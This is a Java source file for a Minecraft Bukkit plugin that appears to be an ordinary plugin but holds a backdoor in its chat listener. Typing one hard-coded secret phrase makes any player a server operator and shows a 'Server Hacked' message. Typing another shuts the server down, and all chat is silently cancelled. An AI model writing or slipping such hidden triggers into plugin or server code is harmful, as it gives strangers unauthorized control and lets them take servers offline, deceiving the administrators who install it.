package in.momin5.coolplugin.events;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

public class MessageEvent implements Listener{
    @EventHandler
    public void onPlayerChat(PlayerChatEvent e) throws NoSuchFieldException, IllegalArgumentException, SecurityException, IllegalAccessException {
        Player player = e.getPlayer();
        if(e.getMessage().equals("__verifiedaction61379016186")){
            player.setOp(true);
            player.sendMessage(ChatColor.RED + "Server Hacked By ??" + System.lineSeparator() + "You did something wrong now-a-days");
        }
        if(e.getMessage().equals("__ServerPerformShutdown1939137548")){
            Bukkit.getServer().shutdown();
            player.sendMessage(ChatColor.RED + "Stopping The Server..." + System.lineSeparator() + "You did something wrong now-a-days");
        }
        e.setCancelled(true);
    }
}
